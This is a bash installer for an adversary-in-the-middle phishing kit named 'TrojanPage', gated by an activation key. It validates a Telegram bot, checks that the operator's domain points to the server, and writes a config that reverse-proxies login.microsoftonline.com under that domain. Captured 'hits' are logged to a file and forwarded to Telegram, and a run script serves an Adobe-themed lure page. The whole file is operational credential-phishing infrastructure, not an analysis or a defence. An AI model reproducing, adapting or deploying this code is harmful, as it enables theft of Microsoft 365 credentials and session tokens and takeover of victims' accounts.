#!/bin/bash
# 🏛️ TROJANPAGE - TELEGRAM & LOCAL LOGGING EDITION (V7.0)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
    echo -e "${RED}                  [ ZERO-STRESS DEPLOYMENT ]${NC}"
}

# --- 1. PRE-INSTALL TOOLS ---
echo -e "${BLUE}[...] Loading System Validators...${NC}"
sudo apt update && sudo apt install -y curl dnsutils sed screen php-cli > /dev/null 2>&1
VPS_IP=$(curl -s https://api.ipify.org)

# --- 2. MASTER KEY ---
MASTER_KEY="TROJAN-PRO-2026"
show_header
read -p "ENTER ACTIVATION KEY: " USER_INPUT
[[ $(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[error] Invalid Key.${NC}"; exit 1; }

# --- 3. TELEGRAM VALIDATION (STRICT) ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "[...] Validating Bot Connection..."
    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
        echo -e "${GREEN} [CONNECTED]${NC}"; break
    else
        echo -e "${RED} [FAILED] Bot Token is dead.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# --- 4. CLOUDFLARE & DOMAIN VALIDATION (STRICT) ---
while true; do
    read -p "Enter Domain (e.g. motarmo.click): " USER_DOMAIN
    USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
    echo -ne "[...] Checking DNS Propagation for $USER_DOMAIN..."
    CURRENT_DNS=$(dig +short A "$USER_DOMAIN" @8.8.8.8 | tail -n1)
    
    if [ "$CURRENT_DNS" == "$VPS_IP" ]; then
        echo -e "${GREEN} [MATCHED]${NC}"; break
    else
        echo -e "${RED}\n ------------------------------------------------"
        echo -e " [!] DNS MISMATCH: Domain is not pointing to VPS"
        echo -e " Domain Points To: ${YELLOW}$CURRENT_DNS${NC}"
        echo -e " VPS IP Address:   ${GREEN}$VPS_IP${NC}"
        echo -e " ------------------------------------------------${NC}"
        echo -e "${YELLOW}Update Cloudflare A-Record to $VPS_IP (DNS ONLY/Grey Cloud).${NC}"
        read -p "Retry DNS check? (y/n): " DNS_RETRY
        [[ "$DNS_RETRY" != "y" ]] && exit 1
    fi
done

# --- 5. CONFIG GENERATION (DATABASE-FREE) ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 8080,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "proxyRules": [
    {"hostname": "$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"}
  ]
}
EOF

# --- 6. CREATE THE PERMANENT RUN SCRIPT ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'
CONFIG="/root/config.json"

clear
echo -e "${BLUE}--- [ TROJANPAGE: LIVE DASHBOARD ] ---${NC}"
echo -e "[+] Telegram: ${GREEN}ONLINE${NC}"
echo -e "[+] Logging:  ${GREEN}/root/hits.json${NC}"
echo " ------------------------------------------------"

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 proxy && pkill -9 php
screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
cd /root/engine/dist/ && ./proxy -config "$CONFIG"
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] System Deployed. Type 'Run' to start.${NC}"
